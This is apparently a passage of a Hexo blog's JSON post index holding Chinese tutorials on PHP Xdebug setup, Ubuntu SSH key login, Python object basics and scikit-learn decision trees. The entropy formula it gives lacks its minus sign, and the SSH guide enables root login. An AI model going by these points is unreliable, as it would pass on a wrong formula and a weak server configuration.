1&#125;&#125;&#125;])","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"db","slug":"web/db","permalink":"https://17307.github.io/categories/web/db/"}],"tags":[]},{"title":"php调试","slug":"php调试","date":"2018-08-29T04:54:23.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/29/php调试/","link":"","permalink":"https://17307.github.io/2018/08/29/php调试/","excerpt":"配置php xdebug.","text":"配置php xdebug. Xdebug 安装 在 phpinfo()中确定版本 在 https://xdebug.org/download.php 寻找合适版本(64位和32位可以都试一试) 需要注意 TS,VC11部分 将下载后的内容放到 xampp/php/ext 中 在php.ini中添加如下配置 12345678[Xdebug]zend_extension=\"E:\\code\\language\\php\\xampp5\\php\\ext\\php_xdebug-2.5.5-5.6-vc11.dll\"xdebug.remote_enable = onxdebug.remote_handler = dbgpxdebug.remote_mode = reqxdebug.remote_host = localhostxdebug.remote_port = 9000xdebug.idekey = PHPSTORM 重启apache服务.检查phpinfo()中是否有 xdebug 配置phpstorm File-&gt;Settings-&gt;Languages &amp; Frameworks-&gt;PHP-&gt;Servers File-&gt;Settings-&gt;Languages &amp; Frameworks-&gt;PHP-&gt;Debug 配置 XDebug helper 在Chrome中搜索并安装 XDebug helper 扩展。 安装成功后，在 Chrome 扩展程序列表中找到 XDebug helper，点击选项，将 IDE key 选项选为 PhpStorm 开启 在 PHPStorm 中开启 Debug 监听，点击右上角像电话一样的图标，图标变绿表示成功； 在 Chrome 中开启 XDebug helper 插件：","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"php","slug":"web/php","permalink":"https://17307.github.io/categories/web/php/"}],"tags":[]},{"title":"ubuntu-ssh","slug":"ubuntu-ssh","date":"2018-06-15T08:47:48.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/06/15/ubuntu-ssh/","link":"","permalink":"https://17307.github.io/2018/06/15/ubuntu-ssh/","excerpt":"关于linux如何配置ssh","text":"关于linux如何配置ssh 关于连接Ubuntu首先需要打开22号端口打开Ubuntu SSH 22端口的方法如下：需要安装OpenSSH server 使用命令安装：sudo apt-get install openssh-server然后重启配置文件:sudo /etc/init.d/ssh restart 配置通过密钥连接ssh 首先在服务器上制作密钥对。首先用密码登录到你打算使用密钥登录的账户，然后执行以下命令：ssh-keygen用户的home目录中生成了一个 .ssh 的隐藏目录，内含两个密钥文件。id_rsa 为私钥，id_rsa.pub 为公钥. 键入以下命令，在服务器上安装公钥： cd .sshcat id_rsa.pub &gt;&gt; authorized_keys 如此便完成了公钥的安装。为了确保连接成功，请保证以下文件权限正确： chmod 600 authorized_keyschmod 700 ~/.ssh –这里路径需要更改 设置 SSH，打开密钥登录功能 编辑 /etc/ssh/sshd_config 文件，进行如下设置：RSAAuthentication yesPubkeyAuthentication yes 另外，请留意 root 用户能否通过 SSH 登录：PermitRootLogin yes 当你完成全部设置，并以密钥方式登录成功后，再禁用密码登录：PasswordAuthentication no 可选 最后，重启 SSH 服务： service sshd restart github 地址 “https://github.com/17307/Learning/blob/master/linux/ssh.md&quot;","categories":[{"name":"others","slug":"others","permalink":"https://17307.github.io/categories/others/"},{"name":"linux","slug":"others/linux","permalink":"https://17307.github.io/categories/others/linux/"}],"tags":[]},{"title":"python基础","slug":"python基础","date":"2018-06-09T03:02:34.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/06/09/python基础/","link":"","permalink":"https://17307.github.io/2018/06/09/python基础/","excerpt":"python对象，引用，类","text":"python对象，引用，类 python普通对象python中的变量与对象、可变对象和不可变对象：12a = 3 #创建 int对象 3，创建变量a， 变量a指向对象3 a = \"test\" #创建string对象，变量a指向对象\"test\" 对象：可变对象和不可变对象，不可变对象包括int，float，long，str，tuple等，可变对象包括list，set，dict等。 需要注意的是：这里说的不可变指的是对象值的不可变。 对于不可变类型的对象，如果要更改变量，则会创建一个新值，把变量绑定到新的对象上，而旧值如果没有被引用就等待垃圾回收。 可变类型数据对对象操作的时候，不需要再在其他地方申请内存，只需要在此对象后面连续申请(+/-)即可，也就是它的内存地址会保持不变，但区域会变长或者变短。 浅拷贝和深拷贝 使用copy.copy()，可以进行对象的浅拷贝，它复制了对象，但对于对象中的元素，依然使用原始的引用. 如果需要复制一个容器对象，以及它里面的所有元素（包含元素的子元素），可以使用copy.deepcopy()进行深拷贝 对于非容器类型（如数字、字符串、和其他’原子’类型的对象）没有被拷贝一说 如果元祖变量只包含原子类型对象，则不能深拷贝，看下面的例子 python 类 __init__() 构造函数 __del__() 析构函数 __p 私有属性 __method() 私有方法 方法:123456789101112131415__init__ : 构造函数，在生成对象时调用__del__ : 析构函数，释放对象时使用__repr__ : 打印，转换__setitem__ : 按照索引赋值__getitem__: 按照索引获取值__len__: 获得长度__cmp__: 比较运算__call__: 函数调用__add__: 加运算__sub__: 减运算__mul__: 乘运算__div__: 除运算__mod__: 求余运算__pow__: 乘方__str__: print()","categories":[{"name":"python","slug":"python","permalink":"https://17307.github.io/categories/python/"}],"tags":[]},{"title":"决策树","slug":"决策树","date":"2018-06-06T16:38:16.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/06/07/决策树/","link":"","permalink":"https://17307.github.io/2018/06/07/决策树/","excerpt":"决策树(包括ID3,C4.5)以及sk-learn基础使用","text":"决策树(包括ID3,C4.5)以及sk-learn基础使用 决策树决策树ID3算法的信息论基础 熵度量了事物的不确定性，越不确定的事物，它的熵就越大。具体的，随机变量X的熵的表达式如下: &lt;center&gt; $$info(X)=H(X)=\\sum_{i=1}^{n}{p_i}log_{2}{p_i}$$&lt;center&gt; 决策树构建 ID3 C4.5 sk-learn来自http://sklearn.apachecn.org/cn/latest/modules/tree.html#tree-multioutput 二分类问题123from sklearn import treefrom sklearn.datasets import load_iris # iris数据import graphviz # 用于导出决策树 12345678910def test1(): X = [[0, 0], [1, 1]] Y = [0, 1] clf = tree.DecisionTreeClassifier() clf = clf.fit(X, Y) # 预测数据值 print(clf.predict([[2., 2.]])) # 预测数据值的概率,与类别一一对应 print(clf.predict_proba([[2., 2.]])) 多分类与展示123456789101112131415161718def test2(): iris = load_iris() clf = tree.DecisionTreeClassifier() clf = clf.fit(iris.data, iris.target) dot_data = tree.export_graphviz(clf, out_file=None) # 数字形式的树 graph = graphviz.Source(dot_data) # 图形化树 graph.render(\"img/iris\") # 生成iris.pdf \"\"\" :func: export_graphviz 出导出还支持各种美化，包括通过他们的类着色节点（或回归值），如果需要，使用显式变量和类名。Jupyter notebook也可以自动找出相同的模块:: dot_data = tree.export_graphviz(clf, out_file=None, # doctest: +SKIP feature_names=iris.feature_names, # doctest: +SKIP class_names=iris.target_names, # doctest: +SKIP filled=True, rounded=True, # doctest: +SKIP special_characters=True) # doctest: +SKIP \"\"\" 回归问题sk-learn 可以用来解决决策树回归算法。决策树通过使用 DecisionTreeRegressor 类也可以用来解决回归问题。 多值输出该模块通过在 DecisionTreeClassifier 和 :class:DecisionTreeRegressor 中实现该策略来支持多输出问题。 使用技巧 对于拥有大量特征的数据决策树会出现过拟合的现象。获得一个合适的样本比例和特征数量十分重要，因为在高维空间中只有少量的样本的树是十分容易过拟合的。 考虑事先进行降维 PCA , ICA ，使树更好地找到具有分辨性的特征。 通过 export 功能可以可视化您的决策树。使用 max_depth=3 作为初始树深度，让决策树知道如何适应数据，然后再增加树的深度。 填充树的样本数量会增加树的每个附加级别。使用 max_depth 来控制输的大小防止过拟合 通过使用 min_samples_split 和 min_samples_leaf 来控制叶节点上的样本数量。当这个值很小时意味着生成的决策树将会过拟合，然而当这个值很大时将会不利于决策树的对样本的学习。所以尝试 min_samples_leaf=5 作为初始值。如果样本的变化量很大，可以使用浮点数作为这两个参数中的百分比。两者之间的主要区别在于 min_samples_leaf 保证叶结点中最少的采样数，而 min_samples_split 可以创建任意小的叶子，尽管在文献中 min_samples_split 更常见 在训练之前平衡您的数据集，以防止决策树偏向于主导类.可以通过从每个类中抽取相等数量的样本来进行类平衡，或者优选地通过将每个类的样本权重 (sample_weight) 的和归一化为相同的值。还要注意的是，基于权重的预修剪标准 (min_weight_fraction_leaf) 对于显性类别的偏倚偏小，而不是不了解样本权重的标准，如 min_samples_leaf 。 如果样本被加权，则使用基于权重的预修剪标准 min_weight_fraction_leaf 来优化树结构将更容易，这确保叶节点包含样本权重的总和的至少一部分。 所有的决策树内部使用 np.float32 数组 ，如果训练数据不是这种格式，将会复制数据集 如果输入的矩阵X为稀疏矩阵，建议您在调用fit之前将矩阵X转换为稀疏的csc_matrix ,在调用predict之前将 csr_matrix 稀疏。当特征在大多数样本中具有零值时，与密集矩阵相比，稀疏矩阵输入的训练时间可以快几个数量级","categories":[{"name":"ML&DL","slug":"ML-DL","permalink":"https://17307.github.io/categories/ML-DL/"}],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2017-09-30T09:39:06.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2017/09/30/hello-world/","link":"","permalink":"https://17307.github.io/2017/09/30/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}